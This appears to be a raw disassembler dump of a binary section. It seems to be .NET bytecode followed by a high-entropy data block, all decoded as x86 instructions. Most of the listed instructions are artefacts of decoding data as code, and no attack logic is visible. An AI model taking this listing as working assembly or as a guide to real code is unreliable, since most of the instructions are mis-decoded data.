  4025b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4025b8:	3e 00 00             	add    %al,%ds:(%eax)
  4025bb:	0a dc                	or     %ah,%bl
  4025bd:	09 2a                	or     %ebp,(%edx)
  4025bf:	00 01                	add    %al,(%ecx)
  4025c1:	28 00                	sub    %al,(%eax)
  4025c3:	00 02                	add    %al,(%edx)
  4025c5:	00 15 00 09 1e 00    	add    %dl,0x1e0900
  4025cb:	0a 00                	or     (%eax),%al
  4025cd:	00 00                	add    %al,(%eax)
  4025cf:	00 02                	add    %al,(%edx)
  4025d1:	00 0d 00 24 31 00    	add    %cl,0x312400
  4025d7:	0a 00                	or     (%eax),%al
  4025d9:	00 00                	add    %al,(%eax)
  4025db:	00 02                	add    %al,(%edx)
  4025dd:	00 07                	add    %al,(%edi)
  4025df:	00 34 3b             	add    %dh,(%ebx,%edi,1)
  4025e2:	00 0a                	add    %cl,(%edx)
  4025e4:	00 00                	add    %al,(%eax)
  4025e6:	00 00                	add    %al,(%eax)
  4025e8:	1b 30                	sbb    (%eax),%esi
  4025ea:	02 00                	add    (%eax),%al
  4025ec:	3c 00                	cmp    $0x0,%al
  4025ee:	00 00                	add    %al,(%eax)
  4025f0:	07                   	pop    %es
  4025f1:	00 00                	add    %al,(%eax)
  4025f3:	11 28                	adc    %ebp,(%eax)
  4025f5:	14 00                	adc    $0x0,%al
  4025f7:	00 0a                	add    %cl,(%edx)
  4025f9:	0a 73 45             	or     0x45(%ebx),%dh
  4025fc:	00 00                	add    %al,(%eax)
  4025fe:	0a 0b                	or     (%ebx),%cl
  402600:	06                   	push   %es
  402601:	02 6f 49             	add    0x49(%edi),%ch
  402604:	00 00                	add    %al,(%eax)
  402606:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402609:	07                   	pop    %es
  40260a:	6f                   	outsl  %ds:(%esi),(%dx)
  40260b:	47                   	inc    %edi
  40260c:	00 00                	add    %al,(%eax)
  40260e:	0a de                	or     %dh,%bl
  402610:	0a 08                	or     (%eax),%cl
  402612:	2c 06                	sub    $0x6,%al
  402614:	08 6f 3e             	or     %ch,0x3e(%edi)
  402617:	00 00                	add    %al,(%eax)
  402619:	0a dc                	or     %ah,%bl
  40261b:	07                   	pop    %es
  40261c:	6f                   	outsl  %ds:(%esi),(%dx)
  40261d:	48                   	dec    %eax
  40261e:	00 00                	add    %al,(%eax)
  402620:	0a 0d de 0a 07 2c    	or     0x2c070ade,%cl
  402626:	06                   	push   %es
  402627:	07                   	pop    %es
  402628:	6f                   	outsl  %ds:(%esi),(%dx)
  402629:	3e 00 00             	add    %al,%ds:(%eax)
  40262c:	0a dc                	or     %ah,%bl
  40262e:	09 2a                	or     %ebp,(%edx)
  402630:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402633:	00 02                	add    %al,(%edx)
  402635:	00 14 00             	add    %dl,(%eax,%eax,1)
  402638:	09 1d 00 0a 00 00    	or     %ebx,0xa00
  40263e:	00 00                	add    %al,(%eax)
  402640:	02 00                	add    (%eax),%al
  402642:	0c 00                	or     $0x0,%al
  402644:	24 30                	and    $0x30,%al
  402646:	00 0a                	add    %cl,(%edx)
  402648:	00 00                	add    %al,(%eax)
  40264a:	00 00                	add    %al,(%eax)
  40264c:	22 1f                	and    (%edi),%bl
  40264e:	40                   	inc    %eax
  40264f:	80 01 00             	addb   $0x0,(%ecx)
  402652:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402655:	1e                   	push   %ds
  402656:	02 28                	add    (%eax),%ch
  402658:	06                   	push   %es
  402659:	00 00                	add    %al,(%eax)
  40265b:	0a 2a                	or     (%edx),%ch
  40265d:	00 00                	add    %al,(%eax)
  40265f:	00 10                	add    %dl,(%eax)
  402661:	3f                   	aas
  402662:	00 00                	add    %al,(%eax)
  402664:	ac                   	lods   %ds:(%esi),%al
  402665:	c2 38 92             	ret    $0x9238
  402668:	97                   	xchg   %eax,%edi
  402669:	7a b0                	jp     0x40261b
  40266b:	9b                   	fwait
  40266c:	8c af 88 5a cd bb    	mov    %gs,-0x4432a578(%edi)
  402672:	2d 36 1e 65 1b       	sub    $0x1b651e36,%eax
  402677:	ea dc bb 0f c2 d6 88 	ljmp   $0x88d6,$0xc20fbbdc
  40267e:	50                   	push   %eax
  40267f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402680:	51                   	push   %ecx
  402681:	0b a6 92 73 b8 d4    	or     -0x2b478c6e(%esi),%esp
  402687:	4e                   	dec    %esi
  402688:	f5                   	cmc
  402689:	d6                   	salc
  40268a:	df 32                	fbstp  (%edx)
  40268c:	22 a5 25 b2 57 84    	and    -0x7ba84ddb(%ebp),%ah
  402692:	9f                   	lahf
  402693:	83 29 dc             	subl   $0xffffffdc,(%ecx)
  402696:	70 ed                	jo     0x402685
  402698:	bb b9 3e 45 e8       	mov    $0xe8453eb9,%ebx
  40269d:	d6                   	salc
  40269e:	34 d4                	xor    $0xd4,%al
  4026a0:	7b 99                	jnp    0x40263b
  4026a2:	79 06                	jns    0x4026aa
  4026a4:	05 66 7f 5b ac       	add    $0xac5b7f66,%eax
  4026a9:	5f                   	pop    %edi
  4026aa:	a3 3b 8c 90 89       	mov    %eax,0x89908c3b
  4026af:	65 62 2c c2          	bound  %ebp,%gs:(%edx,%eax,8)
  4026b3:	4f                   	dec    %edi
  4026b4:	3f                   	aas
  4026b5:	e8 a7 19 bf 92       	call   0x92ff4061
  4026ba:	b8 d4 72 d7 2f       	mov    $0x2fd772d4,%eax
  4026bf:	e5 41                	in     $0x41,%eax
  4026c1:	f0 4d                	lock dec %ebp
  4026c3:	1a 0b                	sbb    (%ebx),%cl
  4026c5:	9c                   	pushf
  4026c6:	d3 aa e0 5b 13 93    	shrl   %cl,-0x6ceca420(%edx)
  4026cc:	8b ff                	mov    %edi,%edi
  4026ce:	85 57 dd             	test   %edx,-0x23(%edi)
  4026d1:	a2 7f a3 87 93       	mov    %al,0x9387a37f
  4026d6:	0a 9b 68 bd 19 fa    	or     -0x5e64298(%ebx),%bl
  4026dc:	a2 9d f7 f2 a2       	mov    %al,0xa2f2f79d
  4026e1:	1c 95                	sbb    $0x95,%al
  4026e3:	ba ca 02 6c f6       	mov    $0xf66c02ca,%edx
  4026e8:	ba f3 3d 3f 2e       	mov    $0x2e3f3df3,%edx
  4026ed:	6d                   	insl   (%dx),%es:(%edi)
  4026ee:	d3 58 ea             	rcrl   %cl,-0x16(%eax)
  4026f1:	aa                   	stos   %al,%es:(%edi)
  4026f2:	11 a2 5d c9 d6 35    	adc    %esp,0x35d6c95d(%edx)
  4026f8:	74 06                	je     0x402700
  4026fa:	e8 0f 79 eb 94       	call   0x952ba00e
  4026ff:	60                   	pusha
  402700:	d1 83 0c 6e b3 1f    	roll   $1,0x1fb36e0c(%ebx)
  402706:	1a ad 03 6f a9 d7    	sbb    -0x285690fd(%ebp),%ch
  40270c:	68 4c e8 3b 4c       	push   $0x4c3be84c
  402711:	ba 1f d3 b4 dd       	mov    $0xddb4d31f,%edx
  402716:	30 c1                	xor    %al,%cl
  402718:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402719:	72 7d                	jb     0x402798
  40271b:	9f                   	lahf
  40271c:	4c                   	dec    %esp
  40271d:	66 fd                	data16 std
  40271f:	ba 59 03 f0 f6       	mov    $0xf6f00359,%edx
  402724:	c0 47 85 b4          	rolb   $0xb4,-0x7b(%edi)
  402728:	97                   	xchg   %eax,%edi
  402729:	16                   	push   %ss
  40272a:	17                   	pop    %ss
  40272b:	63 8a 55 9c a7 7f    	arpl   %ecx,0x7fa79c55(%edx)
  402731:	49                   	dec    %ecx
  402732:	46                   	inc    %esi
  402733:	dd 7b 5f             	fnstsw 0x5f(%ebx)
  402736:	4f                   	dec    %edi
  402737:	83 a4 dc 31 a4 91 1f 	andl   $0x1f,0x1f91a431(%esp,%ebx,8)
  40273e:	1f 
  40273f:	8e 5c 5d a5          	mov    -0x5b(%ebp,%ebx,2),%ds
  402743:	82 be 07 bf eb 34 13 	cmpb   $0x13,0x34ebbf07(%esi)
  40274a:	3a d0                	cmp    %al,%dl
  40274c:	d4 15                	aam    $0x15
  40274e:	bf a9 33 f0 30       	mov    $0x30f033a9,%edi
  402753:	c1 8a e4 a6 eb 51 bc 	rorl   $0xbc,0x51eba6e4(%edx)
  40275a:	e7 8a                	out    %eax,$0x8a
  40275c:	63 c4                	arpl   %eax,%esp
  40275e:	d4 a0                	aam    $0xa0
  402760:	b9 ec 2f d1 29       	mov    $0x29d12fec,%ecx
  402765:	30 5f 69             	xor    %bl,0x69(%edi)
  402768:	98                   	cwtl
  402769:	b0 de                	mov    $0xde,%al
  40276b:	52                   	push   %edx
  40276c:	ee                   	out    %al,(%dx)
  40276d:	bc f6 db b0 23       	mov    $0x23b0dbf6,%esp
  402772:	e1 82                	loope  0x4026f6
  402774:	5b                   	pop    %ebx
  402775:	58                   	pop    %eax
  402776:	f1                   	int1
  402777:	ed                   	in     (%dx),%eax
  402778:	3d a3 e1 ed 18       	cmp    $0x18ede1a3,%eax
  40277d:	bb 75 11 b9 6d       	mov    $0x6db91175,%ebx
  402782:	43                   	inc    %ebx
  402783:	9c                   	pushf
  402784:	47                   	inc    %edi
  402785:	55                   	push   %ebp
  402786:	63 8c 37 b9 7e 1a 93 	arpl   %ecx,-0x6ce58147(%edi,%esi,1)
  40278d:	1f                   	pop    %ds
  40278e:	5b                   	pop    %ebx
  40278f:	c0 04 46 e0          	rolb   $0xe0,(%esi,%eax,2)
  402793:	26 b5 5f             	es mov $0x5f,%ch
  402796:	db b4 a6 32 fd ae 40 	(bad) 0x40aefd32(%esi,%eiz,4)
  40279d:	15 e3 bd 3a a5       	adc    $0xa53abde3,%eax
  4027a2:	4d                   	dec    %ebp
  4027a3:	06                   	push   %es
  4027a4:	31 ce                	xor    %ecx,%esi
  4027a6:	68 45 d2 d5 d7       	push   $0xd7d5d245
  4027ab:	f8                   	clc
  4027ac:	e1 36                	loope  0x4027e4
  4027ae:	75 02                	jne    0x4027b2
  4027b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4027b1:	64 71 ff             	fs jno 0x4027b3
  4027b4:	73 71                	jae    0x402827
  4027b6:	31 59 9a             	xor    %ebx,-0x66(%ecx)
  4027b9:	5c                   	pop    %esp
  4027ba:	45                   	inc    %ebp
  4027bb:	53                   	push   %ebx
  4027bc:	d7                   	xlat   %ds:(%ebx)
  4027bd:	de 4e 4f             	fimuls 0x4f(%esi)
  4027c0:	eb 82                	jmp    0x402744
  4027c2:	c3                   	ret
  4027c3:	34 6f                	xor    $0x6f,%al
  4027c5:	37                   	aaa
  4027c6:	97                   	xchg   %eax,%edi
  4027c7:	89 fa                	mov    %edi,%edx
  4027c9:	97                   	xchg   %eax,%edi
  4027ca:	89 f9                	mov    %edi,%ecx
  4027cc:	d6                   	salc
  4027cd:	81 d8 fc a7 29 b0    	sbb    $0xb029a7fc,%eax
  4027d3:	d2 96 c2 5c 03 f7    	rclb   %cl,-0x8fca33e(%esi)
  4027d9:	24 0d                	and    $0xd,%al
  4027db:	47                   	inc    %edi
  4027dc:	3a 25 cd cc 75 f2    	cmp    0xf275cccd,%ah
  4027e2:	b3 10                	mov    $0x10,%bl
  4027e4:	d6                   	salc
  4027e5:	25 35 d6 61 7d       	and    $0x7d61d635,%eax
  4027ea:	6a 40                	push   $0x40
  4027ec:	e8 9e c6 77 66       	call   0x66b7ee8f
  4027f1:	95                   	xchg   %eax,%ebp
  4027f2:	50                   	push   %eax
  4027f3:	88 c7                	mov    %al,%bh
  4027f5:	c5 22                	lds    (%edx),%esp
  4027f7:	eb 33                	jmp    0x40282c
  4027f9:	cf                   	iret
  4027fa:	95                   	xchg   %eax,%ebp
  4027fb:	77 62                	ja     0x40285f
  4027fd:	b5 d8                	mov    $0xd8,%ch
  4027ff:	90                   	nop
  402800:	85 8b 90 6e 5c 7d    	test   %ecx,0x7d5c6e90(%ebx)
  402806:	7b bb                	jnp    0x4027c3
  402808:	69 12 f5 27 f3 74    	imul   $0x74f327f5,(%edx),%edx
  40280e:	c4 42 8d             	les    -0x73(%edx),%eax
  402811:	85 f4                	test   %esi,%esp
  402813:	d5 eb                	aad    $0xeb
  402815:	20 a4 d9 8d c4 ef 24 	and    %ah,0x24efc48d(%ecx,%ebx,8)
  40281c:	20 ca                	and    %cl,%dl
  40281e:	3b 9a 72 38 81 67    	cmp    0x67813872(%edx),%ebx
  402824:	d0 02                	rolb   $1,(%edx)
  402826:	82 3e f3             	cmpb   $0xf3,(%esi)
  402829:	ea 1f c0 36 83 41 22 	ljmp   $0x2241,$0x8336c01f
  402830:	3e d9 10             	fsts   %ds:(%eax)
  402833:	55                   	push   %ebp
  402834:	eb 90                	jmp    0x4027c6
  402836:	97                   	xchg   %eax,%edi
  402837:	69 32 20 b8 a2 a5    	imul   $0xa5a2b820,(%edx),%esi
  40283d:	cb                   	lret
  40283e:	9d                   	popf
  40283f:	7c 49                	jl     0x40288a
  402841:	10 6d 2f             	adc    %ch,0x2f(%ebp)
  402844:	e0 34                	loopne 0x40287a
  402846:	aa                   	stos   %al,%es:(%edi)
  402847:	92                   	xchg   %eax,%edx
  402848:	cb                   	lret
  402849:	9f                   	lahf
  40284a:	8c d1                	mov    %ss,%ecx
  40284c:	d7                   	xlat   %ds:(%ebx)
  40284d:	5a                   	pop    %edx
  40284e:	d9 8c c7 a9 9d ec 6b 	(bad) 0x6bec9da9(%edi,%eax,8)
  402855:	7a 53                	jp     0x4028aa
  402857:	c8 15 09 1e          	enter  $0x915,$0x1e
  40285b:	00 1b                	add    %bl,(%ebx)
  40285d:	12 aa 36 d2 eb ba    	adc    -0x45142dca(%edx),%ch
  402863:	00 de                	add    %bl,%dh
  402865:	e1 98                	loope  0x4027ff
  402867:	de 0f                	fimuls (%edi)
  402869:	7e d2                	jle    0x40283d
  40286b:	8b 6f cb             	mov    -0x35(%edi),%ebp
  40286e:	4c                   	dec    %esp
  40286f:	72 4e                	jb     0x4028bf
  402871:	68 66 c8 f2 1c       	push   $0x1cf2c866
  402876:	5f                   	pop    %edi
  402877:	0f a9                	pop    %gs
  402879:	2e 61                	cs popa
  40287b:	4d                   	dec    %ebp
  40287c:	10 b7 56 ab 53 b1    	adc    %dh,-0x4eac54aa(%edi)
  402882:	22 99 66 40 01 35    	and    0x35014066(%ecx),%bl
  402888:	fd                   	std
  402889:	5e                   	pop    %esi
  40288a:	2f                   	das
  40288b:	33 69 2c             	xor    0x2c(%ecx),%ebp
  40288e:	f3 d6                	repz salc
  402890:	0b 17                	or     (%edi),%edx
  402892:	9b                   	fwait
  402893:	eb 25                	jmp    0x4028ba
  402895:	65 ee                	gs out %al,(%dx)
  402897:	47                   	inc    %edi
  402898:	85 67 f6             	test   %esp,-0xa(%edi)
  40289b:	c4 a5 c1 36 24 00    	les    0x2436c1(%ebp),%esp
  4028a1:	65 cf                	gs iret
  4028a3:	57                   	push   %edi
  4028a4:	fb                   	sti
  4028a5:	36 24 c3             	ss and $0xc3,%al
  4028a8:	20 23                	and    %ah,(%ebx)
  4028aa:	96                   	xchg   %eax,%esi
  4028ab:	e0 0f                	loopne 0x4028bc
  4028ad:	3c 84                	cmp    $0x84,%al
  4028af:	36 71 3c             	ss jno 0x4028ee
  4028b2:	37                   	aaa
  4028b3:	94                   	xchg   %eax,%esp
  4028b4:	d6                   	salc
  4028b5:	98                   	cwtl
  4028b6:	a1 ef 2f 5f 9c       	mov    0x9c5f2fef,%eax
  4028bb:	37                   	aaa
  4028bc:	bb 9d e2 75 64       	mov    $0x6475e29d,%ebx
  4028c1:	46                   	inc    %esi
  4028c2:	34 68                	xor    $0x68,%al
  4028c4:	cf                   	iret
  4028c5:	26 54                	es push %esp
  4028c7:	4b                   	dec    %ebx
  4028c8:	c7                   	(bad)
  4028c9:	b7 26                	mov    $0x26,%bh
  4028cb:	2a 5c c9 55          	sub    0x55(%ecx,%ecx,8),%bl
  4028cf:	1c 4d                	sbb    $0x4d,%al
  4028d1:	b8 ef a0 49 a6       	mov    $0xa649a0ef,%eax
  4028d6:	ae                   	scas   %es:(%edi),%al
  4028d7:	81 23 d2 09 39 61    	andl   $0x613909d2,(%ebx)
  4028dd:	10 d8                	adc    %bl,%al
  4028df:	31 bf 48 e6 a7 3d    	xor    %edi,0x3da7e648(%edi)
  4028e5:	62 91 a4 88 fd b1    	bound  %edx,-0x4e02775c(%ecx)
  4028eb:	2f                   	das
  4028ec:	13 d4                	adc    %esp,%edx
  4028ee:	26 ea 33 f5 81 da d7 	es ljmp $0xb5d7,$0xda81f533
  4028f5:	b5 
  4028f6:	9b                   	fwait
  4028f7:	2c 61                	sub    $0x61,%al
  4028f9:	ae                   	scas   %es:(%edi),%al
  4028fa:	79 e2                	jns    0x4028de
  4028fc:	fe                   	(bad)
  4028fd:	eb 7f                	jmp    0x40297e
  4028ff:	e1 28                	loope  0x402929
  402901:	a9 df 2c 57 dd       	test   $0xdd572cdf,%eax
  402906:	96                   	xchg   %eax,%esi
  402907:	60                   	pusha
  402908:	99                   	cltd
  402909:	eb c7                	jmp    0x4028d2
  40290b:	98                   	cwtl
  40290c:	ad                   	lods   %ds:(%esi),%eax
  40290d:	3e 19 22             	sbb    %esp,%ds:(%edx)
  402910:	37                   	aaa
  402911:	a3 52 6f a1 c3       	mov    %eax,0xc3a16f52
  402916:	c9                   	leave
  402917:	18 93 13 c2 45 a6    	sbb    %dl,-0x59ba3ded(%ebx)
  40291d:	35 14 bb 95 26       	xor    $0x2695bb14,%eax
  402922:	e1 b1                	loope  0x4028d5
  402924:	9a f4 14 17 f9 b1 ce 	lcall  $0xceb1,$0xf91714f4
  40292b:	a3 82 a1 28 10       	mov    %eax,0x1028a182
  402930:	ec                   	in     (%dx),%al
  402931:	3a 43 b5             	cmp    -0x4b(%ebx),%al
  402934:	56                   	push   %esi
  402935:	11 3f                	adc    %edi,(%edi)
  402937:	c0 ea d9             	shr    $0xd9,%dl
  40293a:	c1 33 e4             	shll   $0xe4,(%ebx)
  40293d:	0e                   	push   %cs
  40293e:	2a 4f 72             	sub    0x72(%edi),%cl
  402941:	e0 17                	loopne 0x40295a
  402943:	b1 c5                	mov    $0xc5,%cl
  402945:	32 ce                	xor    %dh,%cl
  402947:	78 56                	js     0x40299f
  402949:	af                   	scas   %es:(%edi),%eax
  40294a:	09 0b                	or     %ecx,(%ebx)
  40294c:	55                   	push   %ebp
  40294d:	03 a3 95 67 25 cc    	add    -0x33da986b(%ebx),%esp
  402953:	8e 23                	mov    (%ebx),%fs
  402955:	c7                   	(bad)
  402956:	51                   	push   %ecx
  402957:	cd 57                	int    $0x57
  402959:	d7                   	xlat   %ds:(%ebx)
  40295a:	0c 9f                	or     $0x9f,%al
  40295c:	ed                   	in     (%dx),%eax
  40295d:	c0 98 2c 1e b1 24 ec 	rcrb   $0xec,0x24b11e2c(%eax)
  402964:	18 f2                	sbb    %dh,%dl
  402966:	ff 08                	decl   (%eax)
  402968:	98                   	cwtl
  402969:	89 1e                	mov    %ebx,(%esi)
  40296b:	41                   	inc    %ecx
  40296c:	10 e0                	adc    %ah,%al
  40296e:	0a 89 c3 09 47 3d    	or     0x3d4709c3(%ecx),%cl
  402974:	42                   	inc    %edx
  402975:	36 bf 8e 3f f4 47    	ss mov $0x47f43f8e,%edi
  40297b:	1a 78 17             	sbb    0x17(%eax),%bh
  40297e:	8c 5a ad             	mov    %ds,-0x53(%edx)
  402981:	91                   	xchg   %eax,%ecx
  402982:	5e                   	pop    %esi
  402983:	f9                   	stc
  402984:	d9 ab 23 04 96 06    	fldcw  0x6960423(%ebx)
  40298a:	94                   	xchg   %eax,%esp
  40298b:	fb                   	sti
  40298c:	6d                   	insl   (%dx),%es:(%edi)
  40298d:	5d                   	pop    %ebp
  40298e:	85 47 a8             	test   %eax,-0x58(%edi)
  402991:	40                   	inc    %eax
  402992:	52                   	push   %edx
  402993:	5f                   	pop    %edi
  402994:	3d 4f e9 69 79       	cmp    $0x7969e94f,%eax
  402999:	17                   	pop    %ss
  40299a:	53                   	push   %ebx
  40299b:	e9 dc c6 8b d8       	jmp    0xd8cbf07c
  4029a0:	0b 41 78             	or     0x78(%ecx),%eax
  4029a3:	5b                   	pop    %ebx
  4029a4:	4e                   	dec    %esi
  4029a5:	48                   	dec    %eax
  4029a6:	aa                   	stos   %al,%es:(%edi)
  4029a7:	93                   	xchg   %eax,%ebx
  4029a8:	1c cb                	sbb    $0xcb,%al
  4029aa:	b2 74                	mov    $0x74,%dl
  4029ac:	ed                   	in     (%dx),%eax
  4029ad:	e2 97                	loop   0x402946
  4029af:	39 82 b7 47 03 5a    	cmp    %eax,0x5a0347b7(%edx)
  4029b5:	ee                   	out    %al,(%dx)
  4029b6:	c3                   	ret
  4029b7:	70 e1                	jo     0x40299a
  4029b9:	f2 d0 a1 fe 4d d2 be 	repnz shlb $1,-0x412db202(%ecx)
  4029c0:	45                   	inc    %ebp
  4029c1:	c3                   	ret
  4029c2:	2c c0                	sub    $0xc0,%al
  4029c4:	22 d0                	and    %al,%dl
  4029c6:	d0 53 ff             	rclb   $1,-0x1(%ebx)
  4029c9:	5a                   	pop    %edx
  4029ca:	97                   	xchg   %eax,%edi
  4029cb:	e7 16                	out    %eax,$0x16
  4029cd:	24 6e                	and    $0x6e,%al
  4029cf:	d7                   	xlat   %ds:(%ebx)
  4029d0:	bf 51 df 0e 59       	mov    $0x590edf51,%edi
  4029d5:	79 ea                	jns    0x4029c1
  4029d7:	79 63                	jns    0x402a3c
  4029d9:	e7 69                	out    %eax,$0x69
  4029db:	5e                   	pop    %esi
  4029dc:	9c                   	pushf
  4029dd:	8e 67 d1             	mov    -0x2f(%edi),%fs
  4029e0:	a1 33 5c 26 36       	mov    0x36265c33,%eax
  4029e5:	a0 f5 d5 c9 ca       	mov    0xcac9d5f5,%al
  4029ea:	1a 12                	sbb    (%edx),%dl
  4029ec:	12 bc 33 07 ac be 6d 	adc    0x6dbeac07(%ebx,%esi,1),%bh
  4029f3:	26 63 ae 89 84 e0 21 	arpl   %ebp,%es:0x21e08489(%esi)
  4029fa:	fc                   	cld
  4029fb:	59                   	pop    %ecx
  4029fc:	7c 2b                	jl     0x402a29
  4029fe:	c0 20 f5             	shlb   $0xf5,(%eax)
  402a01:	9b                   	fwait
  402a02:	53                   	push   %ebx
  402a03:	9a 76 cf cb bc 52 d7 	lcall  $0xd752,$0xbccbcf76
  402a0a:	69 30 dd 84 ee ab    	imul   $0xabee84dd,(%eax),%esi
  402a10:	b1 49                	mov    $0x49,%cl
  402a12:	0f 15 56 67          	unpckhps 0x67(%esi),%xmm2
  402a16:	c9                   	leave
  402a17:	f4                   	hlt
  402a18:	58                   	pop    %eax
  402a19:	bd 61 3c 83 2a       	mov    $0x2a833c61,%ebp
  402a1e:	72 1a                	jb     0x402a3a
  402a20:	f3 03 c7             	repz add %edi,%eax
  402a23:	d8 c3                	fadd   %st(3),%st
  402a25:	40                   	inc    %eax
  402a26:	90                   	nop
  402a27:	9b                   	fwait
  402a28:	0c 77                	or     $0x77,%al
  402a2a:	8a 64 c5 86          	mov    -0x7a(%ebp,%eax,8),%ah
  402a2e:	d4 92                	aam    $0x92
  402a30:	6a 69                	push   $0x69
  402a32:	13 45 24             	adc    0x24(%ebp),%eax
  402a35:	ec                   	in     (%dx),%al
  402a36:	63 ae c3 92 57 ab    	arpl   %ebp,-0x54a86d3d(%esi)
  402a3c:	92                   	xchg   %eax,%edx
  402a3d:	e6 02                	out    %al,$0x2
  402a3f:	bd 73 f8 d5 17       	mov    $0x17d5f873,%ebp
  402a44:	40                   	inc    %eax
  402a45:	59                   	pop    %ecx
  402a46:	81 85 6b 5e 8d ce 92 	addl   $0xa072b592,-0x3172a195(%ebp)
  402a4d:	b5 72 a0 
  402a50:	65 45                	gs inc %ebp
  402a52:	2c 9b                	sub    $0x9b,%al
  402a54:	c5 68 e5             	lds    -0x1b(%eax),%ebp
  402a57:	cb                   	lret
  402a58:	ba 2a 45 63 34       	mov    $0x3463452a,%edx
  402a5d:	68 2f 30 35 09       	push   $0x935302f
  402a62:	3d b1 57 5f b2       	cmp    $0xb25f57b1,%eax
  402a67:	30 06                	xor    %al,(%esi)
  402a69:	1d c6 af 22 ff       	sbb    $0xff22afc6,%eax
  402a6e:	20 58 11             	and    %bl,0x11(%eax)
  402a71:	1f                   	pop    %ds
  402a72:	a2 57 9b 9d a4       	mov    %al,0xa49d9b57
  402a77:	2a 60 35             	sub    0x35(%eax),%ah
  402a7a:	07                   	pop    %es
  402a7b:	69 7e 47 59 e0 dd 51 	imul   $0x51dde059,0x47(%esi),%edi
  402a82:	7b 8e                	jnp    0x402a12
  402a84:	14 2b                	adc    $0x2b,%al
  402a86:	56                   	push   %esi
  402a87:	56                   	push   %esi
  402a88:	6a 2d                	push   $0x2d
  402a8a:	40                   	inc    %eax
  402a8b:	d9 8b c5 a0 03 95    	(bad) -0x6afc5f3b(%ebx)
  402a91:	9c                   	pushf
  402a92:	ed                   	in     (%dx),%eax
  402a93:	d6                   	salc
  402a94:	c1 49 e6 90          	rorl   $0x90,-0x1a(%ecx)
  402a98:	f6 c5 fe             	test   $0xfe,%ch
  402a9b:	71 31                	jno    0x402ace
  402a9d:	ab                   	stos   %eax,%es:(%edi)
  402a9e:	92                   	xchg   %eax,%edx
  402a9f:	79 84                	jns    0x402a25
  402aa1:	80 ba 4d 17 8b 46 58 	cmpb   $0x58,0x468b174d(%edx)
  402aa8:	c9                   	leave
  402aa9:	fa                   	cli
  402aaa:	2e c2 3e a3          	cs ret $0xa33e
  402aae:	da 8a 6d 14 f8 d6    	fimull -0x2907eb93(%edx)
  402ab4:	45                   	inc    %ebp
  402ab5:	3e 8c f6             	ds mov %?,%esi
  402ab8:	29 8b 52 e4 c7 a2    	sub    %ecx,-0x5d381bae(%ebx)
  402abe:	04 28                	add    $0x28,%al
  402ac0:	c2 78 c8             	ret    $0xc878
  402ac3:	29 80 f2 57 b9 04    	sub    %eax,0x4b957f2(%eax)
  402ac9:	7e 73                	jle    0x402b3e
  402acb:	a9 45 9f c3 94       	test   $0x94c39f45,%eax
  402ad0:	03 93 6a 48 3c f1    	add    -0xec3b796(%ebx),%edx
  402ad6:	0d ec c7 b3 82       	or     $0x82b3c7ec,%eax
  402adb:	75 5e                	jne    0x402b3b
  402add:	39 61 26             	cmp    %esp,0x26(%ecx)
  402ae0:	62 dd 2f             	(bad) {%k7}{z}
  402ae3:	c7                   	(bad)
  402ae4:	15 80 a4 f4 43       	adc    $0x43f4a480,%eax
  402ae9:	71 28                	jno    0x402b13
  402aeb:	38 18                	cmp    %bl,(%eax)
  402aed:	c0 86 d7 2b 0d 77 19 	rolb   $0x19,0x770d2bd7(%esi)
  402af4:	28 66 d0             	sub    %ah,-0x30(%esi)
  402af7:	1e                   	push   %ds
  402af8:	f9                   	stc
  402af9:	8d                   	lea    (bad),%edx
  402afa:	d7                   	xlat   %ds:(%ebx)
  402afb:	86 cd                	xchg   %cl,%ch
  402afd:	58                   	pop    %eax
  402afe:	49                   	dec    %ecx
  402aff:	eb f6                	jmp    0x402af7
  402b01:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402b02:	a9 32 21 9f 18       	test   $0x189f2132,%eax
  402b07:	38 f3                	cmp    %dh,%bl
  402b09:	f5                   	cmc
  402b0a:	be c1 7b ca d4       	mov    $0xd4ca7bc1,%esi
  402b0f:	28 46 1b             	sub    %al,0x1b(%esi)
  402b12:	78 20                	js     0x402b34
  402b14:	5c                   	pop    %esp
  402b15:	d0 1c ee             	rcrb   $1,(%esi,%ebp,8)
  402b18:	2c cd                	sub    $0xcd,%al
  402b1a:	2d f7 95 9a db       	sub    $0xdb9a95f7,%eax
  402b1f:	3a d0                	cmp    %al,%dl
  402b21:	24 a6                	and    $0xa6,%al
  402b23:	8d 44 39 8c          	lea    -0x74(%ecx,%edi,1),%eax
  402b27:	19 82 5b ab e8 35    	sbb    %eax,0x35e8ab5b(%edx)
  402b2d:	58                   	pop    %eax
  402b2e:	36 74 64             	ss je  0x402b95
  402b31:	f2 30 fa             	repnz xor %bh,%dl
  402b34:	d5 8d                	aad    $0x8d
  402b36:	c0 1e 7a             	rcrb   $0x7a,(%esi)
  402b39:	0c 45                	or     $0x45,%al
  402b3b:	b4 61                	mov    $0x61,%ah
  402b3d:	1a 85 2e ab 13 be    	sbb    -0x41ec54d2(%ebp),%al
  402b43:	41                   	inc    %ecx
  402b44:	f4                   	hlt
  402b45:	79 07                	jns    0x402b4e
  402b47:	fa                   	cli
  402b48:	5a                   	pop    %edx
  402b49:	f9                   	stc
  402b4a:	51                   	push   %ecx
  402b4b:	60                   	pusha
  402b4c:	b2 f9                	mov    $0xf9,%dl
  402b4e:	0b 29                	or     (%ecx),%ebp
  402b50:	82 b2 1a d1 9f 10 82 	xorb   $0x82,0x109fd11a(%edx)
  402b57:	96                   	xchg   %eax,%esi
  402b58:	09 d2                	or     %edx,%edx
  402b5a:	f4                   	hlt
  402b5b:	3a 71 8f             	cmp    -0x71(%ecx),%dh
  402b5e:	2c 1e                	sub    $0x1e,%al
  402b60:	8c 5f 2c             	mov    %ds,0x2c(%edi)
  402b63:	e1 df                	loope  0x402b44
  402b65:	cb                   	lret
  402b66:	4b                   	dec    %ebx
  402b67:	63 ff                	arpl   %edi,%edi
  402b69:	97                   	xchg   %eax,%edi
  402b6a:	61                   	popa
  402b6b:	ca 13 83             	lret   $0x8313
  402b6e:	9f                   	lahf
  402b6f:	13 7b 19             	adc    0x19(%ebx),%edi
  402b72:	35 17 a7 6d bc       	xor    $0xbc6da717,%eax
  402b77:	ea d0 20 43 e5 ca 59 	ljmp   $0x59ca,$0xe54320d0
  402b7e:	bc 1a c4 53 0e       	mov    $0xe53c41a,%esp
